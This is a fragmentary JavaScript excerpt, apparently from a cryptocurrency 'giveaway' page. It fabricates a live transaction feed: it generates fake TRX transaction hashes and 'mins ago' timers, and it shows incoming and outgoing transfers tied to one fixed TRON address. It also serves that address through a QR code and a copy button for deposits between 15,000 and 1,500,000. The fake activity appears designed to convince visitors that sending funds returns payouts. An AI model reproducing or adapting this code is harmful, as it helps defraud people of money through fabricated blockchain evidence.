...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TNokdbaNR849Db7agTei3vQ41gS8sQeZ3V</span> </td> <td>' +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">TNokdbaNR849Db7agTei3vQ41gS8sQeZ3V</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    "</a> </td> <td>" +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">TNokdbaNR849Db7agTei3vQ41gS8sQeZ3V</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
        ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 15000 && $('#cal-in').val() <= 1500000) {
      ...
      $("#qrcode_svg").attr(
        "src",
        "https://api.qrserver.com/v1/create-qr-code/?data=TNokdbaNR849Db7agTei3vQ41gS8sQeZ3V&size=150x150"
      );
      // $('#paynow')
      //   .parent()
      //   .attr(
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'TNokdbaNR849Db7agTei3vQ41gS8sQeZ3V',
  )
